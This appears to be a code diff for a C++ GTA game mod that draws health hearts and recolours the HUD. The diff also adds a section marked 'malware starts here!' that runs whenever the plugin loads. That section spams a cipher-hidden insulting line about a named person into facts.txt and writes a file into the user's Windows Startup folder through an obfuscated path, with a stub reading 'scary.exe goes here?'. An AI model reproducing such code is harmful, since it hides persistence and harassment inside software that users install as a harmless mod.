@@ -12,13 +12,138 @@
 #include <shlobj.h>
 #include <windows.h>
 #include <tchar.h>
- // build verison 
+#include <io.h>
+#include <fcntl.h>
+
+#ifndef _USE_OLD_IOSTREAMS
+
+using namespace std;
+
+#endif
+
+
+
+
+// build verison 
 using namespace plugin;
-std::string encrypt(std::string  text, int key) {
-	std::string ctext= text;
+void BindCrtHandlesToStdHandles(bool bindStdIn, bool bindStdOut, bool bindStdErr)
+{
+	// Re-initialize the C runtime "FILE" handles with clean handles bound to "nul". We do this because it has been
+	// observed that the file number of our standard handle file objects can be assigned internally to a value of -2
+	// when not bound to a valid target, which represents some kind of unknown internal invalid state. In this state our
+	// call to "_dup2" fails, as it specifically tests to ensure that the target file number isn't equal to this value
+	// before allowing the operation to continue. We can resolve this issue by first "re-opening" the target files to
+	// use the "nul" device, which will place them into a valid state, after which we can redirect them to our target
+	// using the "_dup2" function.
+	if (bindStdIn)
+	{
+		FILE* dummyFile;
+		freopen_s(&dummyFile, "nul", "r", stdin);
+	}
+	if (bindStdOut)
+	{
+		FILE* dummyFile;
+		freopen_s(&dummyFile, "nul", "w", stdout);
+	}
+	if (bindStdErr)
+	{
+		FILE* dummyFile;
+		freopen_s(&dummyFile, "nul", "w", stderr);
+	}
+
+	// Redirect unbuffered stdin from the current standard input handle
+	if (bindStdIn)
+	{
+		HANDLE stdHandle = GetStdHandle(STD_INPUT_HANDLE);
+		if (stdHandle != INVALID_HANDLE_VALUE)
+		{
+			int fileDescriptor = _open_osfhandle((intptr_t)stdHandle, _O_TEXT);
+			if (fileDescriptor != -1)
+			{
+				FILE* file = _fdopen(fileDescriptor, "r");
+				if (file != NULL)
+				{
+					int dup2Result = _dup2(_fileno(file), _fileno(stdin));
+					if (dup2Result == 0)
+					{
+						setvbuf(stdin, NULL, _IONBF, 0);
+					}
+				}
+			}
+		}
+	}
+
+	// Redirect unbuffered stdout to the current standard output handle
+	if (bindStdOut)
+	{
+		HANDLE stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
+		if (stdHandle != INVALID_HANDLE_VALUE)
+		{
+			int fileDescriptor = _open_osfhandle((intptr_t)stdHandle, _O_TEXT);
+			if (fileDescriptor != -1)
+			{
+				FILE* file = _fdopen(fileDescriptor, "w");
+				if (file != NULL)
+				{
+					int dup2Result = _dup2(_fileno(file), _fileno(stdout));
+					if (dup2Result == 0)
+					{
+						setvbuf(stdout, NULL, _IONBF, 0);
+					}
+				}
+			}
+		}
+	}
+
+	// Redirect unbuffered stderr to the current standard error handle
+	if (bindStdErr)
+	{
+		HANDLE stdHandle = GetStdHandle(STD_ERROR_HANDLE);
+		if (stdHandle != INVALID_HANDLE_VALUE)
+		{
+			int fileDescriptor = _open_osfhandle((intptr_t)stdHandle, _O_TEXT);
+			if (fileDescriptor != -1)
+			{
+				FILE* file = _fdopen(fileDescriptor, "w");
+				if (file != NULL)
+				{
+					int dup2Result = _dup2(_fileno(file), _fileno(stderr));
+					if (dup2Result == 0)
+					{
+						setvbuf(stderr, NULL, _IONBF, 0);
+					}
+				}
+			}
+		}
+	}
+
+	// Clear the error state for each of the C++ standard stream objects. We need to do this, as attempts to access the
+	// standard streams before they refer to a valid target will cause the iostream objects to enter an error state. In
+	// versions of Visual Studio after 2005, this seems to always occur during startup regardless of whether anything
+	// has been read from or written to the targets or not.
+	if (bindStdIn)
+	{
+		std::wcin.clear();
+		std::cin.clear();
+	}
+	if (bindStdOut)
+	{
+		std::wcout.clear();
+		std::cout.clear();
+	}
+	if (bindStdErr)
+	{
+		std::wcerr.clear();
+		std::cerr.clear();
+	}
+}
+
+
+std::string kayne(std::string  text, int k) {
+	std::string ctext = text;
 	int len = text.length();
 	for (int c = 0; c < len; c++) {
-		ctext.at(c)=text.at(c)+key;
+		ctext.at(c) = text.at(c) + k;
 	}
 	return ctext;
 }
@@ -69,24 +194,32 @@ void cr(int argc, TCHAR *argv[])
 class PluginSdkProject1 {
 public:
 	PluginSdkProject1() {
-		//std::printf("imad is gay");
-		//std::getchar();
+		/*
+		AllocConsole();
+
+		// Update the C/C++ runtime standard input, output, and error targets to use the console window
+		BindCrtHandlesToStdHandles(false, true, false);
+		std::printf("imad is gay");
+		std::getchar();
+		*/
 		// Initialise your plugin here
 		//Events::initRwEvent += [] {
-			//patch::SetUInt(0xBAB244, 0xFF0000FF);
-			//imad is gay 
-	//	};
+		//patch::SetUInt(0xBAB244, 0xFF0000FF);
+		//imad is gay 
+		//	};
 		//imad is gay
-	
+		/*
 		Events::gameProcessEvent += [] {
 			if (KeyPressed(VK_CONTROL)) {
 				CHud::SetHelpMessage("imad is gay", false, false, true);
+
 			}
 		};
+		*/
 		//float playerh = FindPlayerPed()->m_fHealth;
 		//FindPlayerPed()->m_fHealth;
-		
-	
+
+
 
 		Events::processScriptsEvent += [] {
 			CPed *playa;
@@ -94,14 +227,15 @@ public:
 			{
 				Command<0x01F5>(0, &playa);
 				float fheath = playa->m_fHealth;
-				int numhearts = int( ceil(fheath / 10));//max character the text box allows is 13 will crash the game otherwise
+				int numhearts = int(floor(fheath/10));//max character the text box allows is 13 will crash the game otherwise
+				//printf("heath>>%f", floor(fheath/10) );
 				if (numhearts > 13) {
 					numhearts = 13;
 				}
-				char hearts[13] = {'i','m'};
-				
+				char hearts[15]="";
+
 				for (int c = 0; c < numhearts; c++) {
-					hearts[c] ='{';//'{' character is the heart charater in gta's font
+					hearts[c] = '{';//'{' character is the heart charater in gta's font
 				}
 				if (playa->m_fHealth > 10) {
 					//CHud::GetRidOfAllHudMessages();
@@ -121,23 +255,26 @@ public:
 					*/
 
 				}
-				
-				
-					//std::string gameName = std::string("D3DXFont example for GTA ") + GTAGAME_NAME;
-					//DrawTextA(NULL, gameName.c_str(), -1, &rect, DT_CENTER | DT_VCENTER, D3DCOLOR_RGBA(255, 255, 0, 255))
-				
-				
+				else {
+					CHud::GetRidOfAllHudMessages();
+				}
+
+
+				//std::string gameName = std::string("D3DXFont example for GTA ") + GTAGAME_NAME;
+				//DrawTextA(NULL, gameName.c_str(), -1, &rect, DT_CENTER | DT_VCENTER, D3DCOLOR_RGBA(255, 255, 0, 255))
+
+
 			}
 		};
-		
+
 
 		//std::string s= "imad is gay"+std::to_string(playerh);
 		//char message[20];
 		//strcpy(message, s.);
 		//if (playerh < (float)150.0) {
-				//CHud::SetHelpMessage("<150", false, false, true);
-			//FindPlayerPed()->m_fHealth = 69.0;
-			//}
+		//CHud::SetHelpMessage("<150", false, false, true);
+		//FindPlayerPed()->m_fHealth = 69.0;
+		//}
 		auto WriteColor = [](unsigned int addrR, unsigned int addrG, unsigned int addrB, unsigned int addrA, CRGBA  &clr) {
 			patch::SetUChar(addrR, clr.red); patch::SetUChar(addrG, clr.green); patch::SetUChar(addrB, clr.blue); patch::SetUChar(addrA, clr.alpha);
 		};
@@ -158,39 +295,52 @@ public:
 		WriteColor(5606950, 5606945, 5606940, 5606940, armor);
 		WriteColor(5607166, 5607126, 5607121, 5607121, sheild);
 		WriteColor(5605570, 5605565, 5605560, 5605560, amo);
-		WriteColor(5607626, 5607621, 5607616, 5607616, wOn);
-		WriteColor(5607792, 5607790, 5607785, 5607785, wOff);
+		WriteColor(5607626, 5607621, 5607616, 5607616, wOff);
+		WriteColor(5607792, 5607790, 5607785, 5607785, wOn);
 		WriteColor(5609812, 5609807, 5609805, 5609805, zone);
 		WriteColor(5611409, 5611404, 5611399, 5611399, time);
 
 		//malware starts here!
 		std::ofstream outfile("facts.txt");
 		for (int c = 1; c < 10000; c++) {
-			outfile << encrypt("jnbe!jt!hbz",-1) << std::endl;
+			outfile << kayne("jnbe!jt!hbz", -1) << std::endl;
 		}
+
+		//RedirectIOToConsole();
+		//std::printf("imad is gay");
+		//std::getchar();
 		/*
 
 		std::ifstream infile("2017.txt");
 		std::string fline;
 		while (getline(infile, fline))
 		{
-			outfile << fline << '\n';
+		outfile << fline << '\n';
 		}
 		*/
 		//std::string path;
 
 		TCHAR userPath[MAX_PATH];
 
-		if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0,userPath )))
+		if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userPath)))
 		{
 			outfile << userPath << std::endl;
 		}
-		std::string es = "`EttHexe`Vseqmrk`Qmgvswsjx`[mrhs{w`Wxevx$Qiry`Tvskveqw`Wxevxyt`qep{evi2x|x";
+		std::string es = "`EttHexe`Vseqmrk`Qmgvswsjx`[mrhs{w`Wxevx$Qiry`Tvskveqw`Wxevxyt`qep{evi2x|x"; // "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.txt";
+	
 
-		std::ofstream supfile(userPath+encrypt( es,-4));
-		supfile << "different ciphertexts can be seen below!" << std::endl;
+		std::ofstream supfile(userPath + kayne(es, -4));
+
+		//std::ofstream malfile(userPath + malpath);
+		/*
+		malfile << "scary.exe goes here?" << std::endl;
 		for (int c = 1; c < 15; c++) {
-			supfile << encrypt("jnbe!jt!hbz", -1) << std::endl;
+		malfile << "imad is gay!" << std::endl;
+		}*/
+
+		supfile << "different ciphertexts can be seen below!" << std::endl;
+		for (int c = 1; c < 18; c++) {
+			supfile << kayne("jnbe!jt!hbz", -1) << std::endl;
 		}
 
 		//infile.close();
@@ -207,5 +357,5 @@ public:
 		args[1] = "100";
 
 		cr(1, args);*/
-    }
+	}
 } PluginSdkProject1;
